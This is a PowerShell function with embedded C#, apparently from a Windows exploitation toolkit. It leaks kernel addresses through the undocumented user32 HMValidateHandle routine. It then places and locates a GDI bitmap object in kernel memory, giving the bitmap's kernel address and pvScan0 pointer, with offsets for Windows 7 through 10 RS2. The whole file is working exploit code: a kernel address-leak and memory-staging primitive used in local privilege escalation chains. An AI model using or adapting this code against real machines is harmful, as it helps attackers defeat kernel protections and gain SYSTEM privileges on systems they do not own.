function Stage-HmValidateHandleBitmap {
<#
.SYNOPSIS
	Universal x64 Bitmap leak using HmValidateHandle.
	Targets: 7, 8, 8.1, 10, 10 RS1, 10 RS2

	Resources:
		+ Win32k Dark Composition: Attacking the Shadow part of Graphic subsystem <= 360Vulcan
		+ LPE vulnerabilities exploitation on Windows 10 Anniversary Update <= Drozdov Yurii & Drozdova Liudmila

.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None

.EXAMPLE
	PS C:\Users\b33f> Stage-HmValidateHandleBitmap |fl
	
	BitmapKernelObj : -7692235059200
	BitmappvScan0   : -7692235059120
	BitmapHandle    : 1845828432
	
	PS C:\Users\b33f> $Manager = Stage-HmValidateHandleBitmap
	PS C:\Users\b33f> "{0:X}" -f $Manager.BitmapKernelObj
	FFFFF901030FF000
#>
	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	
	public class HmValidateHandleBitmap
	{	
		delegate IntPtr WndProc(
			IntPtr hWnd,
			uint msg,
			IntPtr wParam,
			IntPtr lParam);
	
		[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
		struct WNDCLASS
		{
			public uint style;
			public IntPtr lpfnWndProc;
			public int cbClsExtra;
			public int cbWndExtra;
			public IntPtr hInstance;
			public IntPtr hIcon;
			public IntPtr hCursor;
			public IntPtr hbrBackground;
			[MarshalAs(UnmanagedType.LPWStr)]
			public string lpszMenuName;
			[MarshalAs(UnmanagedType.LPWStr)]
			public string lpszClassName;
		}
	
		[DllImport("user32.dll")]
		static extern System.UInt16 RegisterClassW(
			[In] ref WNDCLASS lpWndClass);
	
		[DllImport("user32.dll")]
		public static extern IntPtr CreateWindowExW(
			UInt32 dwExStyle,
			[MarshalAs(UnmanagedType.LPWStr)]
			string lpClassName,
			[MarshalAs(UnmanagedType.LPWStr)]
			string lpWindowName,
			UInt32 dwStyle,
			Int32 x,
			Int32 y,
			Int32 nWidth,
			Int32 nHeight,
			IntPtr hWndParent,
			IntPtr hMenu,
			IntPtr hInstance,
			IntPtr lpParam);
	
		[DllImport("user32.dll")]
		static extern System.IntPtr DefWindowProcW(
			IntPtr hWnd,
			uint msg,
			IntPtr wParam,
			IntPtr lParam);
	
		[DllImport("user32.dll")]
		public static extern bool DestroyWindow(
			IntPtr hWnd);
	
		[DllImport("user32.dll")]
		public static extern bool UnregisterClass(
			String lpClassName,
			IntPtr hInstance);
	
		[DllImport("kernel32",CharSet=CharSet.Ansi)]
		public static extern IntPtr LoadLibrary(
			string lpFileName);
	
		[DllImport("kernel32",CharSet=CharSet.Ansi,ExactSpelling=true)]
		public static extern IntPtr GetProcAddress(
			IntPtr hModule,
			string procName);
	
		public delegate IntPtr HMValidateHandle(
			IntPtr hObject,
			int Type);
	
		[DllImport("gdi32.dll")]
		public static extern IntPtr CreateBitmap(
			int nWidth,
			int nHeight,
			uint cPlanes,
			uint cBitsPerPel,
			IntPtr lpvBits);
	
		public UInt16 CustomClass(string class_name, string menu_name)
		{
			m_wnd_proc_delegate = CustomWndProc;
			WNDCLASS wind_class = new WNDCLASS();
			wind_class.lpszClassName = class_name;
			wind_class.lpszMenuName = menu_name;
			wind_class.lpfnWndProc = System.Runtime.InteropServices.Marshal.GetFunctionPointerForDelegate(m_wnd_proc_delegate);
			return RegisterClassW(ref wind_class);
		}
	
		private static IntPtr CustomWndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam)
		{
			return DefWindowProcW(hWnd, msg, wParam, lParam);
		}
	
		private WndProc m_wnd_proc_delegate;
	}
"@
	
	#------------------[Create/Destroy Window]
	# Call nonstatic public method => delegWndProc
	$AtomCreate = New-Object HmValidateHandleBitmap
	
	function Create-WindowObject {
		$MenuBuff = "A"*0x8F0
		$hAtom = $AtomCreate.CustomClass("BitmapStager",$MenuBuff)
		[HmValidateHandleBitmap]::CreateWindowExW(0,"BitmapStager",[String]::Empty,0,0,0,0,0,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero)
	}
	
	function Destroy-WindowObject {
		param ($Handle)
		$CallResult = [HmValidateHandleBitmap]::DestroyWindow($Handle)
		$CallResult = [HmValidateHandleBitmap]::UnregisterClass("BitmapStager",[IntPtr]::Zero)
	}
	
	#------------------[Cast HMValidateHandle]
	function Cast-HMValidateHandle {
		$hUser32 = [HmValidateHandleBitmap]::LoadLibrary("user32.dll")
		$lpIsMenu = [HmValidateHandleBitmap]::GetProcAddress($hUser32, "IsMenu")
		
		# Get HMValidateHandle pointer
		for ($i=0;$i-lt50;$i++) {
			if ($([System.Runtime.InteropServices.Marshal]::ReadByte($lpIsMenu.ToInt64()+$i)) -eq 0xe8) {
				$HMValidateHandleOffset = [System.Runtime.InteropServices.Marshal]::ReadInt32($lpIsMenu.ToInt64()+$i+1)
				[IntPtr]$lpHMValidateHandle = $lpIsMenu.ToInt64() + $i + 5 + $HMValidateHandleOffset
			}
		}
	
		if ($lpHMValidateHandle) {
			# Cast IntPtr to delegate
			[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($lpHMValidateHandle,[HmValidateHandleBitmap+HMValidateHandle])
		}
	}
	
	#------------------[lpszMenuName Leak]
	function Leak-lpszMenuName {
		param($WindowHandle)
		$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
		$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
		if ($OSMajorMinor -eq "10.0" -And $OSVersion.Build -ge 15063) {
			$pCLSOffset = 0xa8
			$lpszMenuNameOffset = 0x90
		} else {
			$pCLSOffset = 0x98
			$lpszMenuNameOffset = 0x88
		}
	
		# Cast HMValidateHandle & get window desktop heap pointer
		$HMValidateHandle = Cast-HMValidateHandle
		$lpUserDesktopHeapWindow = $HMValidateHandle.Invoke($WindowHandle,1)
	
		# Calculate ulClientDelta & leak lpszMenuName
		$ulClientDelta = [System.Runtime.InteropServices.Marshal]::ReadInt64($lpUserDesktopHeapWindow.ToInt64()+0x20) - $lpUserDesktopHeapWindow.ToInt64()
		$KerneltagCLS = [System.Runtime.InteropServices.Marshal]::ReadInt64($lpUserDesktopHeapWindow.ToInt64()+$pCLSOffset)
		[System.Runtime.InteropServices.Marshal]::ReadInt64($KerneltagCLS-$ulClientDelta+$lpszMenuNameOffset)
	}
	
	#------------------[Bitmap Leak]
	$KernelArray = @()
	for ($i=0;$i -lt 20;$i++) {
		$TestWindowHandle = Create-WindowObject
		$KernelArray += Leak-lpszMenuName -WindowHandle $TestWindowHandle
		if ($KernelArray.Length -gt 1) {
			if ($KernelArray[$i] -eq $KernelArray[$i-1]) {
				Destroy-WindowObject -Handle $TestWindowHandle
				[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50*2*4)
				$BitmapHandle = [HmValidateHandleBitmap]::CreateBitmap(0x701, 2, 1, 8, $Buffer) # +4 kb size
				break
			}
		}
		Destroy-WindowObject -Handle $TestWindowHandle
	}
	
	$BitMapObject = @()
	$HashTable = @{
		BitmapHandle = $BitmapHandle
		BitmapKernelObj = $($KernelArray[$i])
		BitmappvScan0 = $KernelArray[$i] + 0x50
	}
	$Object = New-Object PSObject -Property $HashTable
	$BitMapObject += $Object
	$BitMapObject
}